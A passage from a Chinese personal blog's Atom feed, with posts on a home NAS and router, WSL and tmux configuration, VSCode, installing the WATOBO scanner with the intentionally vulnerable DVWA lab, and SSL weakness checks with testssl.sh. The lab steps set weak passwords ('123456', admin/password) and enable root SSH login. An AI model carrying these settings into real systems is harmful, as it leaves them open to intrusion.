target="_blank" rel="noopener">vmdk镜像</a>  这里原本是gz，通过一个工具转为vmdk，这个网站已经给了转好后的文件，参考即可（注意坑点）</p><p>然后<a href="https://blog.skk.moe/post/hyper-v-win10-lede/" target="_blank" rel="noopener">安装它</a></p><p><a href="https://post.smzdm.com/p/631452/" target="_blank" rel="noopener">安装链接2</a></p><p>软路由就告一段落了~</p><p><img src="https://blog.zzdkl.com.cn/wp-content/uploads/2019/07/Snipaste_2019-07-06_19-36-58.png" alt="软路由设置界面"></p><hr><p>坑点1 ： 注意下载的镜像是否与虚拟机设置一致为uefi或legacy</p><p>坑点2 ： 好像需要在外部虚拟交换机上更改IP才行，问题不大</p><p><del><a href="https://wp.gxnas.com/2365.html" target="_blank" rel="noopener">最好的编译参考链接</a></del></p><p><a href="http://www.openwrt.pro/post-388.html" target="_blank" rel="noopener">完美设置链接</a><br><a href="https://www.landiannews.com/archives/43024.html" target="_blank" rel="noopener">完美设置链接2</a></p><hr><p>分割线</p><p><a href="https://3mile.github.io/archives/968/" target="_blank" rel="noopener">参考资料1</a><br><a href="https://0066.in/archives/801" target="_blank" rel="noopener">参考了解2</a></p><p><a href="http://www.openwrt.pro/post-215.html" target="_blank" rel="noopener">编译参考链接</a></p><h1 id="03-硬盘测试"><a href="#03-硬盘测试" class="headerlink" title="03 硬盘测试"></a>03 硬盘测试</h1><p>使用Windows自带资源池，现在测试性能。</p><p>已在虚拟机上做完实验，镜像类资源池（raid1可以完美支持单盘损坏替换）</p><p>raid0出了点问题，不过问题不大，所以不再测试。 </p><p><a href="http://cnc.xitek.com/thread-1480623-1-1-1.html" target="_blank" rel="noopener">推荐阅读 : </a>  </p><p><a href="https://www.sysgeek.cn/storage-spaces-windows-10/" target="_blank" rel="noopener">参考链接</a>  </p><p><img src="https://blog.zzdkl.com.cn/wp-content/uploads/2019/07/Snipaste_2019-07-06_19-36-38.png" alt="硬盘测试"></p><h1 id="04-黑裙辉"><a href="#04-黑裙辉" class="headerlink" title="04 黑裙辉"></a>04 黑裙辉</h1><p><a href="https://post.smzdm.com/p/444521/" target="_blank" rel="noopener">老旧版本参考</a></p><p>黑裙辉的应该有挺多教程的，先暂置吧，看啥时候有空就直接上手了</p><p>先弄到这里吧，以后上真机了再慢慢操作</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;最近博客更新的内容少了，主要是最近太累了，又接近考试了，所以不能权衡两方面的工作&lt;/p&gt;
&lt;p&gt;最近有了搭建私有云的想法，实现目的有其下几个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;离线下载（主要是百度云离线、下载）&lt;/li&gt;
&lt;li&gt;家庭数据备份（如相片）&lt;/li&gt;
&lt;li&gt;数据同步（私有云）&lt;/li&gt;
&lt;li&gt;（个人服务器）&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Home" scheme="https://zzdkl.com.cn/categories/Home/"/>
    
    
      <category term="NAS" scheme="https://zzdkl.com.cn/tags/NAS/"/>
    
      <category term="HTPC" scheme="https://zzdkl.com.cn/tags/HTPC/"/>
    
      <category term="RouterOS" scheme="https://zzdkl.com.cn/tags/RouterOS/"/>
    
      <category term="Home" scheme="https://zzdkl.com.cn/tags/Home/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://zzdkl.com.cn/2019/08/29/regular_expression/"/>
    <id>https://zzdkl.com.cn/2019/08/29/regular_expression/</id>
    <published>2019-08-29T02:02:43.425Z</published>
    <updated>2019-08-29T02:03:29.989Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>正则表达式查询表</p><a id="more"></a><p><img src="/upload_image/2019/07/07_17_%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-1.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;正则表达式查询表&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://zzdkl.com.cn/categories/Python/"/>
    
      <category term="re" scheme="https://zzdkl.com.cn/categories/Python/re/"/>
    
    
      <category term="re" scheme="https://zzdkl.com.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>WSL设置</title>
    <link href="https://zzdkl.com.cn/2019/08/29/wsl_configuration/"/>
    <id>https://zzdkl.com.cn/2019/08/29/wsl_configuration/</id>
    <published>2019-08-29T01:59:50.835Z</published>
    <updated>2019-08-29T02:01:13.925Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00前言"><a href="#00前言" class="headerlink" title="00前言"></a>00前言</h1><p>—更新—<br>辣鸡wsl, 各种不兼容, 返回vm怀抱</p><p>vm笔记本发热有点严重, 投入wsl怀抱</p><a id="more"></a><p><a href="https://blog.51cto.com/fei007/1166808" target="_blank" rel="noopener">vim粘贴乱码解决</a>  <code>:set paste</code></p><h1 id="01-ssh"><a href="#01-ssh" class="headerlink" title="01 ssh"></a>01 ssh</h1><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install openssh-server</span><br></pre></td></tr></tbody></table></figure><p>vim <code>etc/ssh/sshd_config</code> :  </p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin <span class="literal">yes</span></span><br><span class="line">Port 2222</span><br><span class="line">ListenAddress 127.0.0.1</span><br></pre></td></tr></tbody></table></figure><p>这里不能开机自启, 手动吧</p><h1 id="02-tmux"><a href="#02-tmux" class="headerlink" title="02 tmux"></a>02 tmux</h1><p>首先设置PS1</p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=' <span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>[<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[1;36m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\e</span>[1;32m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[1;33m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\e</span>[35m<span class="symbol">\]</span><span class="symbol">\H</span><span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> <span class="symbol">\[</span><span class="symbol">\e</span>[4;37m<span class="symbol">\]</span>`pwd`<span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span><span class="symbol">\[</span><span class="symbol">\0</span>33[37m<span class="symbol">\]</span>]<span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span><span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\e</span>[36m<span class="symbol">\]</span><span class="symbol">\$</span> =&gt; <span class="symbol">\[</span><span class="symbol">\e</span>[m<span class="symbol">\]</span> '</span><br></pre></td></tr></tbody></table></figure><p>可以使用以下方法</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">git clone https:<span class="comment">//github.com/****/.tmux.git</span></span><br><span class="line">ln -s -f .tmux/<span class="selector-class">.tmux</span><span class="selector-class">.conf</span></span><br><span class="line">cp .tmux/<span class="selector-class">.tmux</span><span class="selector-class">.conf</span><span class="selector-class">.local</span> .</span><br></pre></td></tr></tbody></table></figure><p>优化  <code>vim .tmux.conf</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> | splitw -h -c <span class="string">'#{pane_current_path}'</span> <span class="comment"># 水平方向新增面板，默认进入当前目录</span></span><br></pre></td></tr></tbody></table></figure><p>或者自定义:</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use something easier to type as the prefix.</span></span><br><span class="line"><span class="keyword">set</span> -g prefix C-a</span><br><span class="line">unbind C-b</span><br><span class="line">bind C-a send-prefix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口计数从1开始，方便切换</span></span><br><span class="line"><span class="keyword">set</span> -g base-<span class="keyword">index</span> <span class="number">1</span></span><br><span class="line">setw -g pane-base-<span class="keyword">index</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用和关闭status bar</span></span><br><span class="line">bind S <span class="keyword">set</span> <span class="keyword">status</span> <span class="keyword">on</span></span><br><span class="line">bind D <span class="keyword">set</span> <span class="keyword">status</span> <span class="keyword">off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 消息背景色</span></span><br><span class="line"><span class="comment"># set -g message-bg white</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">mode</span>-<span class="keyword">keys</span> vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭自动重命名窗口</span></span><br><span class="line">setw -g <span class="keyword">allow</span>-<span class="keyword">rename</span> <span class="keyword">off</span></span><br><span class="line">setw -g <span class="keyword">automatic</span>-<span class="keyword">rename</span> <span class="keyword">off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bind a reload key</span></span><br><span class="line">bind r <span class="keyword">source</span>-<span class="keyword">file</span> ~/.tmux.conf \; display-message "Config reloaded..."</span><br><span class="line"></span><br><span class="line"><span class="comment"># I personally rebind the keys so "|" splits the current window vertically, and "-" splits it horizontally. Not the easiest things to type, though easy to remember.</span></span><br><span class="line">bind | split-window -h</span><br><span class="line">bind _ split-window -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># fixes the delay problem</span></span><br><span class="line"><span class="keyword">set</span> -sg escape-<span class="built_in">time</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 面板切换</span></span><br><span class="line">bind-<span class="keyword">key</span> k <span class="keyword">select</span>-pane -U</span><br><span class="line">bind-<span class="keyword">key</span> j <span class="keyword">select</span>-pane -D</span><br><span class="line">bind-<span class="keyword">key</span> h <span class="keyword">select</span>-pane -L</span><br><span class="line">bind-<span class="keyword">key</span> l <span class="keyword">select</span>-pane -R</span><br><span class="line"></span><br><span class="line"><span class="comment"># 面板大小调整</span></span><br><span class="line">bind -r ^k resizep -U <span class="number">10</span></span><br><span class="line">bind -r ^j resizep -D <span class="number">10</span></span><br><span class="line">bind -r ^h resizep -L <span class="number">10</span></span><br><span class="line">bind -r ^l resizep -R <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 状态栏</span></span><br><span class="line"><span class="comment"># 颜色</span></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-bg black</span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-fg white</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对齐方式</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-justify centre</span><br><span class="line"></span><br><span class="line"><span class="comment"># 左下角</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-<span class="keyword">left</span> <span class="string">'#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]'</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g <span class="keyword">status</span>-<span class="keyword">left</span>-<span class="keyword">length</span> <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口列表</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">window</span>-<span class="keyword">option</span> -g <span class="keyword">window</span>-<span class="keyword">status</span>-<span class="keyword">format</span> <span class="string">'#[dim]#I:#[default]#W#[fg=grey,dim]'</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">window</span>-<span class="keyword">option</span> -g <span class="keyword">window</span>-<span class="keyword">status</span>-<span class="keyword">current</span>-<span class="keyword">format</span> <span class="string">'#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 右下角</span></span><br><span class="line"><span class="keyword">set</span> -g <span class="keyword">status</span>-<span class="keyword">right</span> <span class="string">'#[fg=green][#[fg=cyan]%H:%M#[fg=green]]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启鼠标</span></span><br><span class="line"><span class="keyword">set</span>-<span class="keyword">option</span> -g mouse <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 面板</span></span><br><span class="line">unbind <span class="string">'"'</span></span><br><span class="line">bind - splitw -v -c <span class="string">'#{pane_current_path}'</span> <span class="comment"># 垂直方向新增面板，默认进入当前目录</span></span><br><span class="line">unbind %</span><br><span class="line">bind | splitw -h -c <span class="string">'#{pane_current_path}'</span> <span class="comment"># 水平方向新增面板，默认进入当前目录</span></span><br></pre></td></tr></tbody></table></figure><h1 id="03-优化"><a href="#03-优化" class="headerlink" title="03 优化"></a>03 优化</h1><p>关闭cmd的声音  </p><h1 id="04-备份-还原"><a href="#04-备份-还原" class="headerlink" title="04 备份/还原"></a>04 备份/还原</h1><p><a href="https://www.jianshu.com/p/8b4ec8fafdca" target="_blank" rel="noopener">参考</a></p><h1 id="05-代理"><a href="#05-代理" class="headerlink" title="05 代理"></a>05 代理</h1><p>apt-get install proxychains</p><p>vim /etc/proxychains.conf</p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dynamic_chain</span><br><span class="line">socks5  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10808</span></span><br><span class="line">http    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10888</span></span><br></pre></td></tr></tbody></table></figure><p>vim .bashrc</p><figure class="highlight verilog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">complete -c proxychains</span><br><span class="line"><span class="keyword">alias</span> setproxysocks5='<span class="keyword">export</span> ALL_PROXY=socks5h:<span class="comment">//127.0.0.1:10808'</span></span><br><span class="line"><span class="keyword">alias</span> unsetproxy='unset ALL_PROXY'</span><br><span class="line"></span><br><span class="line"><span class="keyword">alias</span> setproxyhttp='<span class="keyword">export</span> ALL_PROXY=http:<span class="comment">//127.0.0.1:10888'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="05-辣鸡zsh-fish"><a href="#05-辣鸡zsh-fish" class="headerlink" title="05 辣鸡zsh/fish"></a>05 辣鸡zsh/fish</h1><p>永别, 不兼容tmux, 字符换显示错误, 各种辣鸡, 永别</p><h1 id="06-自动补齐增强包"><a href="#06-自动补齐增强包" class="headerlink" title="06 自动补齐增强包"></a>06 自动补齐增强包</h1><p>apt-get install bash-completion</p><h1 id="07-其他安装包"><a href="#07-其他安装包" class="headerlink" title="07 其他安装包"></a>07 其他安装包</h1><p>不再赘述</p><h1 id="08-文件传输"><a href="#08-文件传输" class="headerlink" title="08 文件传输"></a>08 文件传输</h1><p>c, d, e盘都在/mnt 的目录下</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00前言&quot;&gt;&lt;a href=&quot;#00前言&quot; class=&quot;headerlink&quot; title=&quot;00前言&quot;&gt;&lt;/a&gt;00前言&lt;/h1&gt;&lt;p&gt;—更新—&lt;br&gt;辣鸡wsl, 各种不兼容, 返回vm怀抱&lt;/p&gt;
&lt;p&gt;vm笔记本发热有点严重, 投入wsl怀抱&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="WSL" scheme="https://zzdkl.com.cn/categories/Windows/WSL/"/>
    
      <category term="Kali" scheme="https://zzdkl.com.cn/categories/Linux/Kali/"/>
    
    
      <category term="WSL" scheme="https://zzdkl.com.cn/tags/WSL/"/>
    
  </entry>
  
  <entry>
    <title>watobo安装使用</title>
    <link href="https://zzdkl.com.cn/2019/08/29/watobo_installation/"/>
    <id>https://zzdkl.com.cn/2019/08/29/watobo_installation/</id>
    <published>2019-08-29T01:57:38.791Z</published>
    <updated>2019-08-29T01:59:20.136Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>WATOBO是一款Web应用程序安全测试工具。</p><a id="more"></a><h1 id="1-安装watobo"><a href="#1-安装watobo" class="headerlink" title="1.安装watobo"></a>1.安装watobo</h1><p>1.在kali安装：</p><figure class="highlight plain"><figcaption><span>install watobo```</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.卸载：```apt-get remove watobo</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="2-安装DVWA-Dam-Vulnerable-Web-Application"><a href="#2-安装DVWA-Dam-Vulnerable-Web-Application" class="headerlink" title="2.安装DVWA(Dam Vulnerable Web Application)"></a>2.安装<strong>DVWA</strong>(Dam Vulnerable Web Application)</h1><p>1.github下载release包</p><p>2.解压到<code>/var/www/html</code>路径下</p><blockquote><p>解压<code>–xvf</code>加上<code>-z</code>为解压gz，加上<code>-j</code>为解压bz2</p></blockquote><p>3.将apache2停止：<code>service apache2 stop</code></p><p>4.给dvwa文件夹相应的权限：<code>chmod -R 755 /var/www/html/dvwa</code></p><blockquote><p>chmod文件及子文件夹加入参数 -R</p></blockquote><p><strong>5.启动mysql服务： <code>service mysql start</code></strong></p><p>6.打开mysql： <code>mysql -u root -p</code></p><p>7.创建数据库：<code>create database dvwa;</code></p><blockquote><p>这里比较坑的是，网上的大部分DVWA安装教程基于旧版的MySQL，现在的是基于mariadb</p></blockquote><p>8.创建新的用户并附加权限：<code>grant all on dvwa.* to dvwa@localhost identified by '123456';</code></p><p>9.权限更新：<code>flush privileges;</code></p><p>10.退出mysql：<code>exit</code></p><p>11.更改config文件</p><ul><li><p>找到<strong>/var/www/html/dvwa/config</strong>文件夹，打开其中的<strong>config.inc.php.list</strong>文件，更改名字为<strong>config.inc.php</strong></p></li><li><p>将$<em>DVWA[ ‘db_password’ ] = ‘<em>_p@ssw0rd</em></em>‘; 这一行改为$<em>DVWA[ ‘db_password’ ] = ‘<em>_123456</em></em>‘;</p></li><li><p>将$<em>DVWA[ ‘db_user’ ] = ‘<em>_root</em></em>‘; 这一行改为$<em>DVWA[ ‘db_user’ ] = ‘<em>_dvwa</em></em>‘;</p></li></ul><p><strong>12.启动apache2服务：<code>service apache2 start</code></strong></p><p>13.访问<strong>127.0.0.1/dvwa</strong>即可,默认用户名为admin，密码为password</p><hr><ul><li><p><strong>重启后，输入第5和第12的命令启动apache和mysql即可</strong></p></li><li><p><strong>git配置socks5代理</strong></p></li></ul><blockquote><p><code>git config --global http.proxy 'socks5://127.0.0.1:1080'</code> </p><p><code>git config --global https.proxy 'socks5://127.0.0.1:1080'</code></p></blockquote><hr><h1 id="3-进行测试"><a href="#3-进行测试" class="headerlink" title="3.进行测试"></a>3.进行测试</h1><p>​    </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;WATOBO是一款Web应用程序安全测试工具。&lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
      <category term="watobo" scheme="https://zzdkl.com.cn/tags/watobo/"/>
    
  </entry>
  
  <entry>
    <title>VSCode写Python调优</title>
    <link href="https://zzdkl.com.cn/2019/08/29/vscode_optimize/"/>
    <id>https://zzdkl.com.cn/2019/08/29/vscode_optimize/</id>
    <published>2019-08-29T01:53:48.368Z</published>
    <updated>2019-08-29T02:42:27.479Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>VS Code天下第一, 现在说一下VS Code写python的时候一些调优</p><a id="more"></a><h1 id="01-代码错误提示和补全"><a href="#01-代码错误提示和补全" class="headerlink" title="01 代码错误提示和补全"></a>01 代码错误提示和补全</h1><p>首先在<code>settings.json</code>中加入<code>python.linting.enabled</code>为<code>true</code><br>截图如下:<br><img src="" alt=""></p><p>然后直接在设置首选项搜索<code>flake8</code>, <code>autopep8</code>全部勾选上</p><h1 id="02-函数提示"><a href="#02-函数提示" class="headerlink" title="02 函数提示"></a>02 函数提示</h1><p>Emmm, 暂未发现, 先保存一下, 后续补充</p><h1 id="03-快捷键大全"><a href="#03-快捷键大全" class="headerlink" title="03 快捷键大全"></a>03 快捷键大全</h1><p><a href="https://code.visualstudio.com/docs/getstarted/keybindings#_keyboard-shortcuts-reference" target="_blank" rel="noopener">官方文档</a><br><a href="https://github.com/crper/Visual-Studio-Code-CNKEYMAP" target="_blank" rel="noopener">GitHub中文版</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;VS Code天下第一, 现在说一下VS Code写python的时候一些调优&lt;/p&gt;
    
    </summary>
    
      <category term="VSCode" scheme="https://zzdkl.com.cn/categories/VSCode/"/>
    
    
      <category term="VSCode" scheme="https://zzdkl.com.cn/tags/VSCode/"/>
    
  </entry>
  
  <entry>
    <title>SSL类安全问题验证</title>
    <link href="https://zzdkl.com.cn/2019/08/29/ssl_security_problem_slove/"/>
    <id>https://zzdkl.com.cn/2019/08/29/ssl_security_problem_slove/</id>
    <published>2019-08-29T01:48:26.759Z</published>
    <updated>2019-08-29T01:49:43.173Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><a id="more"></a><h1 id="00-前言-1"><a href="#00-前言-1" class="headerlink" title="00. 前言"></a>00. 前言</h1><p>最近博客更新有点少，比较忙，今天抽空把SSL类证书的安全问题都理一遍</p><p>预备知识：Linux基础操作，bash相关</p><p>—-坑点1—–<br>不要从Windows上下载工具再移到Linux中</p><p>Windows的保存文本方式换行为\r，从Windows下载的sh脚本会自动加上\r导致出错</p><p><img src="/upload_image/2019/05/Snipaste_2019-05-29_17-50-39.png" alt="图示如下"></p><h1 id="01-总要概述"><a href="#01-总要概述" class="headerlink" title="01. 总要概述"></a>01. 总要概述</h1><p>一条命令即可： </p><p><code>./testssl.sh -4 -O -p &lt;Domain or IP&gt;</code></p><hr><p>SSL 2.0不推荐使用的协议会显示</p><p><code>SSLv2      offered (NOT ok), also VULNERABLE to DROWN attack -- 2 ciphers</code></p><p>检测到RC4密码套件</p><p><code>RC4 (CVE-2013-2566, CVE-2015-2808)        VULNERABLE (NOT ok): RC4-SHA RC4-MD5 RC4-MD5</code></p><p>狮子狗攻击（支持SSLv3）</p><p><code>POODLE, SSL (CVE-2014-3566)               VULNERABLE (NOT ok), uses SSLv3+CBC (check TLS_FALLBACK_SCSV mitigation below)</code></p><hr><p><img src="/upload_image/2019/05/Snipaste_2019-05-29_18-41-13.png" alt="参考图在这里"></p><p>小于2048位的SSL证书公钥使用参数 <code>--wide</code> 或者直接在浏览器查看证书位数</p><h1 id="02-详细情况"><a href="#02-详细情况" class="headerlink" title="02. 详细情况"></a>02. 详细情况</h1><p><code>testssl</code> 官方GitHub下载地址<a href="https://github.com/drwetter/testssl.sh" target="_blank" rel="noopener">点击这里</a></p><p>官方使用参考链接<a href="https://testssl.sh/" target="_blank" rel="noopener">点击这里</a></p><hr><p>参数详解参考官方使用手册</p><p>-4 为RC4密码套件</p><p>-O 为POODLE （狮子狗攻击）</p><p>-p 为检查TLS / SSL协议（包括SPDY / HTTP2）</p><hr><h1 id="03-总结"><a href="#03-总结" class="headerlink" title="03. 总结"></a>03. 总结</h1><p>这工具不错，后续有其他需求再继续补充</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
